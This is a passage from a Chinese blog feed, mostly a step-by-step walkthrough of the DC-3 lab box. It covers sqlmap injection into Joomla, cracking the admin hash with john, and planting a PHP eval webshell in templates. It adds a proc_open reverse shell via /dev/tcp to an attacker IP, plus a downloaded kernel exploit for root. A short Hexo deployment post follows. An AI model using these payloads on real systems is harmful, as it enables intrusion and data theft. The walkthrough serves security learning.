src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240702235531424.png" alt="image-20240702235531424"></p><p>一共有76张表table呢！在其中发现了一个名为<code>users</code>的表，尝试访问。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240702235648824.png" alt="image-20240702235648824"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -u <span class="hljs-string">&quot;http://192.168.204.132/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot;</span> --risk=3 --level=5 --random-agent -D joomladb -T <span class="hljs-string">&quot;#__users&quot;</span> --columns -p list[fullordering]<br></code></pre></td></tr></table></figure><p><code>-T</code>：用于指定目标数据库中的表名。因为数据库名是<code>#__users</code>，但是<code>#</code>在数据库中又表示注释符号，所以需要给给这个字段添加一对双引号，以防止错误解析。</p><p><code>--columns</code>：该参数指示sqlmap列出指定表的所有列。</p><p>在实际的命令运行过程中，会发生有三个需要输入选项的地方，前两个选<code>y</code>之后那个需要选择字典wordlist的地方就什么都不选直接 回车等待结果就好了。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240703150454303.png" alt="image-20240703150454303"></p><p>得到<code>joomladb数据库</code>的表为<code> #__users</code>的<code>列</code>相关信息：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240703150540777.png" alt="image-20240703150540777"></p><p>可以发现其中有名为<code> name 、password、 username</code>的账户信息列。因而我们需要进一步查看这些列的具体信息。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -u <span class="hljs-string">&quot;http://192.168.204.132/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot;</span> --risk=3 --level=5 --random-agent -D joomladb -T <span class="hljs-string">&quot;#__users&quot;</span> -C name,username,password --dump -p list[fullordering]<br></code></pre></td></tr></table></figure><p><code>-C </code>：指定要查询的列名，多个列名之间使用逗号进行分隔。</p><p><code>--dump</code>该参数指示sqlmap将从数据库中检索到的数据打印出来。</p><p>得到如下结果：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240703151043560.png" alt="image-20240703151043560"></p><p>不难想到这是一个管理员的账号，但是密码显然是经过hash加密后的。因此接下来就是要对这个密码进行碰撞破解或是进行重置，将其修改为自己的密码。</p><blockquote><p>name:admin</p><p>username：admin</p><p>password：</p><p>$2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu </p></blockquote><ul><li>重置密码</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">find / -name *<span class="hljs-built_in">hash</span>*<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240703152729545.png" alt="image-20240703152729545"></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240703152857235.png" alt="image-20240703152857235"></p><blockquote><p>.so文件是linux系统中的动态链接库文件，它们通过动态链接的方式在运行时被程序加载。</p></blockquote><p>看了有关于带有<code>hash</code>字样文件的搜索结果，发现其中并没有关于password-hash的加密脚本文件。虽然有几个像的，但是也没有明确显示出就是hash密码加密脚本文件。所以重置密码这个思路可以暂时搁置了。</p><ul><li>碰撞爆破</li></ul><p>使用<code>john</code>工具来实现hash值的碰撞爆破。（kali自带有john）</p><p>首先先将上述获得的管理员密码的hash值保存为<code>user_password_hash.txt</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">touch</span> user_password_hash.txt<br><br>vim user_password_hash.txt<br><br><span class="hljs-built_in">cat</span> user_password_hash.txt<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240703154132239.png" alt="image-20240703154132239"></p><p>然后使用john命令进行碰撞爆破：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">john user_password_hash.txt<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240703154228849.png" alt="image-20240703154228849"></p><p>中间标黄的就是碰撞爆破得到的密码：<code>snoopy </code></p><blockquote><p>username：admin</p><p>password：snoopy</p></blockquote><p>ok！尝试去登陆后台管理系统<code>http://192.168.204.132/administrator/</code>！</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240703154538725.png" alt="image-20240703154538725"></p><p>成功！</p><h2 id="Get-shell"><a href="#Get-shell" class="headerlink" title="Get shell"></a>Get shell</h2><p>到处看看管理系统，发现在Extensions下的Templates（模板）有Templates模板块</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240703154807462.png" alt="image-20240703154807462"></p><p>进入该模板块，发现其中一共有两个模板：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240703154823270.png" alt="image-20240703154823270"></p><p>点进第一个模板，在左侧目录栏进入<code>index.php</code>文件（正常情况下优先考虑的文件）。</p><blockquote><p>有了PHP文件，就可以考虑各种拿shell的方法，包括但不限于一句话木马。</p><ul><li>一句话木马</li></ul><?php @eval($_POST['shell']);?><p>以 <?php 和 ;?> 分别为开头和结尾，然后使用 @ 符号抑制错误输出，后面接着跟着 一个函数名 用于 执行字符串 作为php代码运行。接着跟一个括号，括号内首先跟一个超全局数组 $_POST ，这里表示获取通过POST方法传递的参数，后面接着一个中括号，括号内为向POST传递的一个（命令）字符串，该（命令）字符串将会被前面的函数执行，就是相当于执行某个命令嘛！</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240703160840412.png" alt="image-20240703160840412"></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240703162717989.png" alt="image-20240703162717989"></p><p>在此处设置放入一句话木马🐎（放在最开始吧）：</p><p>注意！这里去头去尾了哦！</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240703232034778.png" alt="image-20240703232034778"></p><p>点击左上角的“save &amp; close”对文件进行保存。</p><p>对第二个模板进行相同的一句话木马注入操作，以防止上面所注入一句话木马的模板并不是目标靶机后台管理系统所使用的模板，进而导致失败瓶颈。</p><p>然后通过中国蚁剑进行连接。</p><blockquote><p>kali安装中国蚁剑的教程为：</p><p><a href="https://blog.csdn.net/liver100day/article/details/120222378%EF%BC%88kali%E5%A6%82%E4%BD%95%E5%AE%89%E8%A3%85%E8%9A%81%E5%89%91%EF%BC%89">https://blog.csdn.net/liver100day/article/details/120222378（kali如何安装蚁剑）</a></p></blockquote><p>安装完kali之后，若想在本地物理主机远程连接以及打开中国蚁剑，那么需要启用X11转发选项。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ssh -X sweet@192.168.204.128<br></code></pre></td></tr></table></figure><p>连接成功后进入到中国蚁剑文件夹中，执行<code>./AntSword</code>命令：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240703211405701.png" alt="image-20240703211405701"></p><p>发现在本地物理主机上启动失败。粗错误信息表示应用程序在试图连接到X服务器的显示屏，但无法打开显示。根据gpt问答，可知需要启用X11转发选项，但是我已经启用了，还是没能成功显示。</p><p>当然也有可能是DISPLAY环境变量没正确设置，但是再次尝试有点花费时间和力气。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240703211719844.png" alt="image-20240703211719844"></p><p>去kali虚拟机上尝试启用中国蚁剑（在kali已经成功安装的基础上）。成功。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240703211900066.png" alt="image-20240703211900066"></p><p>右键空白处选择“ADD”添加数据：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240703213434075.png" alt="image-20240703213434075"></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240703213808540.png" alt="image-20240703213808540"></p><p><code>Shell url</code>:目标靶机的URL地址。</p><p><code>Shell pwd</code>：连接密码，代码参数值，例如 &lt;?php @eval($_POST[‘x’])?;&gt;中的“X”值。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240703213828518.png" alt="image-20240703213828518"></p><p>选中所添加的连接，右键选择第一项<code>Ternimal</code>打开终端。如果能正确连接上目标靶机URL的话就会显示如下界面：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240703234428385.png" alt="image-20240703234428385"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">whoami</span><br><span class="hljs-built_in">ls</span><br><span class="hljs-built_in">id</span><br></code></pre></td></tr></table></figure><p>中国蚁剑连接上目标URL之后，模拟的是正常用户访问该URL，只要访问该URL，网页代码就会被启动，一句话木马就会被触发。我们注入的一句话木马要执行的命令是<code>shell</code>提权命令。所以使用上述检测命令检测当前所获得的权限。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240703234524751.png" alt="image-20240703234524751"></p><p>根据结果可以发现，尽管已经拿到了shell，但是目前所拥有的权限还不是root权限。因此，还需要进行进一步的提权操作。</p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>Linux提权总结：<a href="https://www.cnblogs.com/sfsec/p/15163907.html">https://www.cnblogs.com/sfsec/p/15163907.html</a></p><h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><p>编写通过prop_open反弹shell的php代码：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs bash">// 当系统没有禁用proc_open的时候，我们是可以借助proc_open轻松反弹这样的一个shell的。<br>&lt;?php<br><span class="hljs-variable">$ip</span> = <span class="hljs-string">&#x27;192.168.204.128&#x27;</span>;  // 攻击者的IP地址<br><span class="hljs-variable">$port</span> = 9999;          // 攻击者的端口号<br><br><span class="hljs-variable">$descriptorspec</span> = array(<br>    0 =&gt; array(<span class="hljs-string">&quot;pipe&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>),   // stdin 是一个管道，子进程从中读取数据<br>    1 =&gt; array(<span class="hljs-string">&quot;pipe&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>),   // stdout 是一个管道，子进程向其中写入数据<br>    2 =&gt; array(<span class="hljs-string">&quot;pipe&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>)    // stderr 是一个管道，子进程向其中写入数据<br>);<br><br><span class="hljs-variable">$process</span> = proc_open(<span class="hljs-string">&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/<span class="hljs-variable">$ip</span>/<span class="hljs-variable">$port</span> 0&gt;&amp;1&#x27;&quot;</span>, <span class="hljs-variable">$descriptorspec</span>, <span class="hljs-variable">$pipes</span>);<br><br><span class="hljs-keyword">if</span> (is_resource(<span class="hljs-variable">$process</span>)) &#123;<br>    fclose(<span class="hljs-variable">$pipes</span>[0]);  // 关闭stdin<br>    fclose(<span class="hljs-variable">$pipes</span>[1]);  // 关闭stdout<br>    fclose(<span class="hljs-variable">$pipes</span>[2]);  // 关闭stderr<br><br>    proc_close(<span class="hljs-variable">$process</span>);<br>&#125;<br>?&gt;<br></code></pre></td></tr></table></figure><p>将这段php代码（掐头去尾）分别加入到两个模板文件中的index.php文件中。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240704004311523.png" alt="image-20240704004311523"></p><p>在终端监听设置的端口 <code>9999</code> </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nc -lvvp 9999<br></code></pre></td></tr></table></figure><p><code>nc</code>：netstat，用于监听指定端口，可用于读取或写入网络连接的数据。</p><p><code>-l</code>：监听模式，指示其在指定的端口上监听连接请求。</p><p><code>-v</code>：详细模式</p><p><code>-vv</code>：更详细的详细模式</p><p><code>-p</code>：指定监听的端口号</p><p>然后访问目标网页URL<code>http://192.168.204.132/index.php</code></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240704004700989.png" alt="image-20240704004700989"></p><p>反弹成功，成功获取<code>www-data</code>的权限，伪装成为用户www-data。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240704005119035.png" alt="image-20240704005119035"></p><h3 id="检索提权命令"><a href="#检索提权命令" class="headerlink" title="检索提权命令"></a>检索提权命令</h3><h4 id="查看可使用的命令"><a href="#查看可使用的命令" class="headerlink" title="查看可使用的命令"></a>查看可使用的命令</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">compgen -c<br><br>//查看并过滤与模式列表的模式整行匹配的命令<br>compgen -c | grep -E -x <span class="hljs-string">&quot;nmap|vim|vi|nano|bash|less|more|cp|find|git|wget|cat|apt|zip|xxd|time|taskset|sed|pip|ed|tmux|scp|perl|awk|man|env|ftp&quot;</span><br></code></pre></td></tr></table></figure><p><code>-E</code>：表示使用扩展正则表达式进行匹配。</p><p><code>-x</code>：只匹配整行，即完全匹配 模式 中的整行内容，例nmap。即不断章取义的意思</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240704005209848.png" alt="image-20240704005209848"></p><h4 id="查看具有SUID权限的命令"><a href="#查看具有SUID权限的命令" class="headerlink" title="查看具有SUID权限的命令"></a>查看具有SUID权限的命令</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">find / -perm -u=s -<span class="hljs-built_in">type</span> f 2&gt;/dev/null<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240704005240879.png" alt="image-20240704005240879"></p><p>可执行的命令和能够提权的命令之间似乎没用交集，也就是已知的可使用的命令都不能够用来提权。</p><h3 id="内核漏洞提权"><a href="#内核漏洞提权" class="headerlink" title="内核漏洞提权"></a>内核漏洞提权</h3><p>通过以下指令查询使用的操作系统信息以及内核相关信息。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">uname</span> -a  // 显示系统信息 -a表示可用信息<br><span class="hljs-built_in">cat</span> /etc/issue   //查看系统的简要说明或欢迎信息<br><span class="hljs-built_in">cat</span> /etc/*-release  //查看系统的发行版本信息<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240704005611511.png" alt="image-20240704005611511"></p><p>可以得到的信息是：</p><blockquote><p>Linux DC-3 4.4.0-21-generic #37-Ubuntu SMP Mon Apr 18 18:34:49 UTC 2016 i686 i686 i686 GNU&#x2F;Linux</p><p>Ubuntu 16.04 LTS（VERSION&#x3D;”16.04 LTS (Xenial Xerus)”）</p></blockquote><p>通过searchsploit查找可利用的漏洞代码：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">searchsploit ubuntu 16.04<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240704010041749.png" alt="image-20240704010041749"></p><p>搜索结果不少，一般来说，文件后缀名为<code>txt</code>的漏洞利用比较容易实现。可以对搜索得到的漏洞进行逐一尝试（一共有六个）。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">searchsploit -p 40937.txt<br>searchsploit -p 40943.txt<br>searchsploit -p 41923.txt<br>searchsploit -p 39773.txt<br>searchsploit -p 39772.txt<br>searchsploit -p 40489.txt<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240704110327425.png" alt="image-20240704110327425"></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240704110814118.png" alt="image-20240704110814118"></p><blockquote><p>&#x2F;usr&#x2F;share&#x2F;exploitdb&#x2F;exploits&#x2F;linux&#x2F;local&#x2F;40937.txt</p><p>&#x2F;usr&#x2F;share&#x2F;exploitdb&#x2F;exploits&#x2F;linux&#x2F;local&#x2F;40943.txt</p><p>&#x2F;usr&#x2F;share&#x2F;exploitdb&#x2F;exploits&#x2F;linux&#x2F;local&#x2F;41923.txt</p><p>&#x2F;usr&#x2F;share&#x2F;exploitdb&#x2F;exploits&#x2F;linux&#x2F;dos&#x2F;39773.txt</p><p>&#x2F;usr&#x2F;share&#x2F;exploitdb&#x2F;exploits&#x2F;linux&#x2F;local&#x2F;39772.txt</p><p>&#x2F;usr&#x2F;share&#x2F;exploitdb&#x2F;exploits&#x2F;linux&#x2F;local&#x2F;40489.txt</p><p>没有什么有用的提示</p><p>给出了两个利用文件以及文件下载地址</p><p>给出了漏洞概述以及漏洞代码，似乎没有利用方法</p><p>没有什么有用的提示</p><p>给出了漏洞文件的下载地址以及使用方法（√）</p><p>给出了提权方法，但是是利用ipv6的兼容端口复用的，利用方法没给</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240704114451762.png" alt="image-20240704114451762"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">（进入到对应目录）<br>./compile.sh<br>./doubleput<br>（等待提权成功）<br><span class="hljs-built_in">id</span>   // 验证当前用户身份，是否提权成功<br></code></pre></td></tr></table></figure><blockquote><p>Proof of Concept（概念验证）: <a href="https://bugs.chromium.org/p/project-zero/issues/attachment?aid=232552">https://bugs.chromium.org/p/project-zero/issues/attachment?aid=232552</a><br>Exploit-DB Mirror（下载镜像）: <a href="https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/39772.zip">https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/39772.zip</a></p></blockquote><p>点击下载镜像之后，跳转到浏览器，自动下载成功。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240704114809119.png" alt="image-20240704114809119"></p><p>嗯！怎么可以在本物理机下载漏洞呢！得下在虚拟机啊！记住要以目标靶机合法用户的身份下载！因为后续要进行提权！</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">wget https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/39772.zip<br></code></pre></td></tr></table></figure><p>下载并保存成功了！保存文件名为“39772.zip”</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240704121612377.png" alt="image-20240704121612377"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">unzip 39772.zip<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240704121708628.png" alt="image-20240704121708628"></p><p>创建了一个名为“39772”的文件夹，进入看看它有什么：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> 39772<br><span class="hljs-built_in">ls</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240704121729949.png"></p><p>对这两个tar文件进行解压缩：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">tar -xvf crasher.tar<br>tar -xvf exploit.tar<br></code></pre></td></tr></table></figure><p>**<code>tar</code>**：是 Linux 和类 Unix 系统中用于处理归档文件的命令。</p><p>**<code>-x</code>**：表示执行解压缩操作（extract），即从归档文件中提取文件。</p><p>**<code>-v</code>**：可选参数，表示详细模式（verbose），在解压缩过程中显示详细信息。</p><p>**<code>-f</code>**：指定要操作的归档文件的名称。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240704123036561.png" alt="image-20240704123036561"></p><p>查看当前目录下的文件：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240704123117671.png" alt="image-20240704123117671"></p><p>第二第三个文件的前缀是不是和前面获得的漏洞利用方法那儿一致呀！进入exploit利用文件（因为我们要利用漏洞嘛），然后执行提权命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> ebpf_mapfd_doubleput_exploit<br>./compile.sh<br>./doubleput<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240704123558257.png" alt="image-20240704123558257"></p><p>根据提示信息，我们现在已经获取了root权限！</p><p>开启交互界面：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python -c <span class="hljs-string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br></code></pre></td></tr></table></figure><p>验证是否为root权限：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240704123736857.png" alt="image-20240704123736857"></p><p>接下来就是要找到那个唯一的flag文件了，启用find命令查找：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">find / -name *flag*<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240704124000907.png" alt="image-20240704124000907"></p><p>cat一下看看啦！</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /root/the-flag.txt<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240704124054377.png" alt="image-20240704124054377"></p><p>至此，所有工作完成！</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>sqlmap注入、john碰撞爆破hash、一句话木马注入、通过prop_open反弹shell</p><ul><li><p>拿站后进行提权的方式多样，其中包括</p><ul><li>可执行的二进制文件具有suid权限，特别是相关命令的提权</li><li>内核漏洞脏牛提权</li><li>密码复用提权</li><li>明文root密码提权</li><li>第三方服务提权</li></ul></li><li><p>sqlmap的使用方法多样，通过多种使用方法可以实现不同的效果</p></li><li><p>拿到网站后台管理系统后，可以寻找发布网页或者网页本身内容的php文件，通过插入一句话木马或者反弹shell实现getshell</p></li></ul>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>有关部署GitHub博客的坑</title>
    <link href="/2024/06/28/%E6%9C%89%E5%85%B3%E9%83%A8%E7%BD%B2GitHub%E5%8D%9A%E5%AE%A2%E7%9A%84%E5%9D%91/"/>
    <url>/2024/06/28/%E6%9C%89%E5%85%B3%E9%83%A8%E7%BD%B2GitHub%E5%8D%9A%E5%AE%A2%E7%9A%84%E5%9D%91/</url>
    
    <content type="html"><![CDATA[<blockquote><p>也就是说，如果想创建一个新的博客。执行步骤是：</p><ul><li>新建一个空文件夹</li><li>终端进入该文件夹中，hexo init</li><li>需要下载git，npm install hexo-deployer-git -save</li><li>然后修改博客目录下的 _config.yml 文件，修改语言（注意，名字需要先到主题文件夹下的language上查看，不要拼写错名字了）</li><li>添加deploy配置，type（git），repo（仓库的ssh链接），branch（main）</li><li>hexo g</li><li>hexo d</li><li>hexo s查看效果</li></ul></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
